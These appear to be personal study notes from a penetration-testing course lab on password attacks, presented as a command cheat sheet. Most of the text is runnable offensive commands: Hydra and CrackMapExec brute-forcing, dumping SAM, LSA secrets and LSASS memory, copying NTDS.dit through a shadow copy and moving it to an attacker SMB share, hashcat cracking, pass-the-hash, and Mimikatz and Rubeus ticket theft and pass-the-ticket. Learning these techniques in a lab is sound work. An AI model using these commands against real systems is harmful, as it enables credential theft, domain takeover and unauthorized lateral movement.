## Enumeration
 * [pypykatz](https://github.com/skelsec/pypykatz) - Mimikatz implementation in pure Python.
 * [A Detailed Guide on Rubeus](https://www.hackingarticles.in/a-detailed-guide-on-rubeus/)
 * [Ticket Requests & Renewals](https://docs.specterops.io/ghostpack/rubeus/ticket-requests-and-renewals)

# John The Ripper
## Cracking Modes

Single Crack Mode is one of the most common John modes used when attempting to crack passwords using a single password list. It is a brute-force attack, meaning all passwords on the list are tried, one by one, until the correct one is found.

```
john --format=<hash_type> <hash or hash_file>
john --format=sha256 hashes_to_crack.txt # Example
```
## Wordlist Mode

Wordlist Mode is used to crack passwords using multiple lists of words. It is a dictionary attack which means it will try all the words in the lists one by one until it finds the right one. It is generally used for cracking multiple password hashes using a wordlist or a combination of wordlists.

```
john --wordlist=<wordlist_file> --rules <hash_file>
```

## Incremental Mode

Incremental Mode is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. 

```
john --incremental <hash_file>
```
# Network Services

## CrackMapExec

### Installation
```
git clone https://github.com/byt3bl33d3r/CrackMapExec
# or
sudo apt-get -y install crackmapexec
# or
git clone https://github.com/Pennyw0rth/NetExec
# or
sudo apt-get -y install netexec
```
### Usage

```
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

## Evil-WinRM
### Installation

```
sudo gem install evil-winrm -y
```

### Usage
```
evil-winrm -i <target-IP> -u <username> -p <password>
evil-winrm -i 10.129.42.197 -u user -p password
```

## Hydra - RDP
```
hydra -L user.list -P password.list rdp://10.129.42.197
```

## xFreeRDP
```
xfreerdp /v:<target-IP> /u:<username> /p:<password>
xfreerdp /v:10.129.42.197 /u:user /p:password
```

## Hydra - SMB
```
hydra -L user.list -P password.list smb://10.129.42.197
```

## Hydra - Error
```
hydra -L user.list -P password.list smb://10.129.42.197
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.

```
msfconsole -q
use auxiliary/scanner/smb/smb_login
options
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```

## CrackMapExec
```
crackmapexec smb 10.129.42.197 -u "user" -p "password" --share
```

## Smbclient
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

#  Password Mutations

### Hashcat Rule File
```
cat password.list
password

Function Description
: 	Do nothing.
l 	Lowercase all letters.
u 	Uppercase all letters.
c 	Capitalize the first letter and lowercase others.
sXY 	Replace all instances of X with Y.
$! 	Add the exclamation character at the end.

cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

### Generating Rule-based Wordlist
```
hashcat --force $input -r custom.rule --stdout | sort -u > $output
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list # example

cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

### Hashcat Existing Rules
```
ls /usr/share/hashcat/rules/
```

# Credential Stuffing

[Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
[Default Credentials CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)

# Windows Local Password Attacks

## Attacking SAM

**hklm\sam**	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
**hklm\system** 	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
**hklm\security** 	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

## Creating a Share with smbserver.py

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $some_folder
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $HOME/ # Example
```

Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.
```
move sam.save \\$lhost\CompData
move security.save \\$lhost\CompData
move system.save \\$lhost\CompData
# lhost is the smbserver we created
```

### Locating secretsdump.py
```
locate secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam $HOME/sam.save -security $HOME/security.save -system $HOME/system.save LOCAL

# Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

### Cracking Hashes with Hashcat
```
sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2

sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
### Dumping LSA Secrets Remotely

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Dumping SAM Remotely
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## Attacking LSASS 

### Dumping LSASS Process Memory
```
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
```

A file called lsass.DMP is created and saved in:

```
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

### Rundll32.exe & Comsvcs.dll Method

Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:

### Finding LSASS PID in cmd
From cmd, we can issue the command tasklist /svc and find lsass.exe and its process ID in the PID field.
```
tasklist /svc
```
### Finding LSASS PID in PowerShell

From PowerShell, we can issue the command Get-Process lsass and see the process ID in the Id field.
```
Get-Process lsass
```

### Creating lsass.dmp using PowerShell
With an elevated PowerShell session, we can issue the following command to create the dump file:
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.


### Running Pypykatz
```
 pypykatz lsa minidump $HOME/lsass.dmp 
```
## Cracking the NT Hash with Hashcat

```
sudo hashcat -m 1000 $hash $wordlist
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt # Example
```

# Attacking Active Directory & NTDS.dit
## Dictionary Attacks against AD accounts using CrackMapExec

```
Username Convention 	Practical Example for Jane Jill Doe
firstinitiallastname 	jdoe
firstinitialmiddleinitiallastname 	jjdoe
firstnamelastname 	janedoe
firstname.lastname 	jane.doe
lastname.firstname 	doe.jane
nickname 	doedoehacksstuff
```
### Creating a Custom list of Usernames
We can manually create our list(s) or use an automated list generator such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. 

```
./username-anarchy -i /home/$USER/file.txt 
./username-anarchy -i /home/ltnbob/names.txt 
```
### Launching the Attack with CrackMapExec
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
## Capturing NTDS.dit

NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The .dit stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.

### Connecting to a DC with Evil-WinRM
```
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
### Checking Local Group Membership
```
net localgroup
```
We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.

### Checking User Account Privileges including Domain
```
net user bwilliamson


User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.

```
This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

### Creating Shadow Copy of C:
```
vssadmin CREATE SHADOW /For=C:
```
### Copying NTDS.dit from the VSS
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the Attacking SAM section to review that method if needed.

### Transferring NTDS.dit to Attack Host
```
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

### A Faster Method: Using cme to Capture NTDS.dit

```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

## Cracking Hashes & Gaining Credentials

We can proceed with creating a text file containing all the NT hashes, or we can individually copy & paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.

### Cracking a Single Hash with Hashcat
```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
64f12cddaa88057e06a81b54e73b949b:Password1
```
In many of the techniques we have covered so far, we have had success in cracking hashes we've obtained.
*What if we are unsuccessful in cracking a hash?*

## Pass-the-Hash Considerations

We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the [NTLM authentication protocol](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) to authenticate a user using a password hash. Instead of username:clear-text password as the format for login, we can instead use username:password hash. Here is an example of how this would work:

### Pass-the-Hash with Evil-WinRM Example+

```
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

# PAREI AQUI Credential Hunting in Windows


# Pass the Ticket (PtT) from Windows
The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

 1. The **TGT - Ticket Granting Ticket** is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or TGS.
 2. The **TGS - Ticket Granting Service** is requested by users who want to use a service. These tickets allow services to verify the user's identity.

## Pass the Ticket (PtT) Attack

We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:

1. Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
2. Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz and Rubeus.

### Harvesting Kerberos Tickets from Windows

On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

We can harvest all tickets from a system using the Mimikatz module *sekurlsa::tickets /export*. The result is a list of files with the extension *.kirbi*, which contain the tickets.

```
mimikatz.exe
sekurlsa::tickets /export
exit
```
The tickets that end with **$** correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an **@** that separates the service name and the domain, for example: **[randomvalue]-username@service-domain.local.kirbi**.

We can also export tickets using Rubeus and the option dump. This option can be used to dump all tickets (if running as a local administrator). **Rubeus dump**, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option **/nowrap** for easier copy-paste.

```
Rubeus.exe dump /nowrap
```

## Pass the Key or OverPass the Hash

The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT).

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.

### Mimikatz - Extract Kerberos Keys
```
mimikatz.exe
sekurlsa::ekeys
```
Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the *OverPass the Hash* or *Pass the Key* attack using Mimikatz and Rubeus.

### Mimikatz - Pass the Key or OverPass the Hash

```
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:$domain /user:plaintext /ntlm:$user_hash
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f # Example
```
This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.

To forge a ticket using Rubeus, we can use the module *asktgt* with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.

### Rubeus - Pass the Key or OverPass the Hash
```
Rubeus.exe
asktgt /domain:$dfomain /user:plaintext /$crypto:$user_hash /nowrap
asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap # Example
```

**Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.**

# Pass the Ticket (PtT)

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.

## Rubeus Pass the Ticket
```
Rubeus.exe asktgt /domain:$domain /user:plaintext /rc4:$user_hash /ptt
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt # Example

Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt$domain.kirbi
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi # Example
```

### Convert .kirbi to Base64 Format

```
powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$file"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi")) # Example
```

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.
```
Rubeus.exe ptt /ticket:$ticket
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMC # Example
```

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.

```
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbt
gt-inlanefreight.htb.kirbi"
exit
```

# Pass The Ticket with PowerShell Remoting (Windows)

PowerShell Remoting allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

## Mimikatz - PowerShell Remoting with Pass the Ticket

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new cmd.exe and execute mimikatz.exe, then import the ticket we collected using kerberos::ptt. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command Enter-PSSession to connect to the target machine.

### Mimikatz - Pass the Ticket for Lateral Movement.

```
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
PS Enter-PSSession -ComputerName DC01
PS whoami
PS hostname
```

## Rubeus - PowerShell Remoting with Pass the Ticket

Rubeus has the option createnetonly, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag **/show** to display the process, and the result is the equivalent of **runas /netonly**. This prevents the erasure of existing TGTs for the current logon session.

### Create a Sacrificial Process with Rubeus
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.


### Rubeus - Pass the Ticket for Lateral Movement
```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
powershell
Enter-PSSession -ComputerName DC01
whoami
```

